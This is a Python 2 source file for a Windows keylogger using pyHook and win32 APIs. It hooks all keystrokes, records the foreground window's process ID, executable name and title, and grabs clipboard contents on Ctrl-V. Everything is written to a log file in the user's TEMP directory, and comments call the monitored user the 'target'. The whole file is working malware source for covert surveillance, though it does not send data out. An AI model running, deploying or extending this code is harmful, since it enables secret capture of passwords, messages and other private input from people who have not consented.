from ctypes import *
import pythoncom
import optparse
import datetime
import pyHook 
import win32clipboard
import os



user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

#add some globals
termVar = ''	
# tdir = os.getenv('TEMP')
logfile = 'placeholder'
logcount = 2


# ## determine at rtunetime: log named by Y-M-D 
# tdir = os.getenv('TEMP')
# tn = str(datetime.date.today())
# tfl = tdir + tn
# logfile = tn + 'lol.txt'
# print "logfile: %s " % logfile


# def get_term(termVar):		   
	# if termVar == True:
		# return 
		  


def get_current_process():

	# get a handle to the foreground window
	hwnd = user32.GetForegroundWindow()

	# find the process ID
	pid = c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd, byref(pid))

	# store the current process ID
	process_id = "%d" % pid.value

	# grab the executable
	executable = create_string_buffer("\x00" * 512)
	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	# now read it's title
	window_title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(window_title),512)

	# print out the header if we're in the right process
	print
	print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
	print
	
	# open it again to make sure
	f = open(logfile, 'a')
	m = str(process_id)
	n = executable.value
	o = window_title.value
	g = "\n[ PID: %s - %s - %s ]\n" % (m, n, o)
	f.write("%s" % g),
	
	# close handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process) 


def KeyStroke(event):
	
	global current_window   
	global logcount
	global logfile
	
	
	# tdir = os.getenv('TEMP')
	# tn = 'lololtestinggggg.txt'
	# tfl = tdir + tn
	# logfile = tn + 'lol.txt'
	if logcount > 1:
		logcount = logcount - 1
		print "logfile: %s " % logfile
	f = open(logfile, 'a')
	# check to see if target changed windows
	if event.WindowName != current_window:
		current_window = event.WindowName        
		get_current_process()

	# if they pressed a standard key
	if event.Ascii > 32 and event.Ascii < 127:
		print chr(event.Ascii)
		f.write("%s"% chr(event.Ascii)),
	else:
		# if [Ctrl-V], get the value on the clipboard
		# added by Dan Frisch 2014
		if event.Key == "Space": 
			spacev = " "
			f.write("%s" % spacev)
		if event.Key == "Tab":
			tabv = "	"
			f.write("%s" % tabv)
		if event.Key == "Return":
			f.write("""
			""")
		if event.Key == "V":
			win32clipboard.OpenClipboard()
			pasted_value = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			print "[PASTE] - %s" % (pasted_value)
			f.write("\nPASTED %s, \n" % pasted_value),
		else:
				print "%s" % event.Key
				# f.write("PASTED: [%s], \n" % pasted_value)
				f.write("%s" % event.Key)
				f.close() 
				#print "logfile: %s " % logfile
			

	# pass execution to next hook registered 
		return True
	
		
def main():
	global logfile
	parser = optparse.OptionParser('usage = %prog --file <filename in temp w/o file ext blank 4 random> -h for help')
	parser.add_option('--file', dest='filen', type='string', help='specific PDF file name ** default is date+lol.txt in USER TEMP directory', default = None)
	parser.add_option('--stdout', help='True to print in terminal, false to just log to file. Defaults false', dest = 'pterm', default = False, action = 'store_true')
	# parser.add_usage('--filename <filename in temp w/o file ext blank 4 random> --stdout <True/False for terminal printout> -h for help')
	# parser.add_option('--time' dest='logt', type='string', help='How long to run in seconds\nLeave blank to run forever')
	(options, args) = parser.parse_args()
	fileName = options.filen
	termVar = bool(options.pterm)
	# logTime = int(options.logt)
	# globals	
	# termVar
	# if termVar == True:
		# print "[+] Writing to terminal! \n"
		# exit(0)
	if fileName == None:         
		print parser.usage
		exit(0)
	if fileName > 0:
		tdir = os.getenv('TEMP')
		tn = tdir + "\\"
		logfile = tn + fileName
		print "[+] Writing custom logfile: %s " % logfile
	# if len(logTime) > 0: 
	# else:
	kl         = pyHook.HookManager()
	kl.KeyDown = KeyStroke
	# register the hook and execute forever
	kl.HookKeyboard()
	pythoncom.PumpMessages()
	
if __name__ == '__main__':
	main()
	# create and register a hook manager 

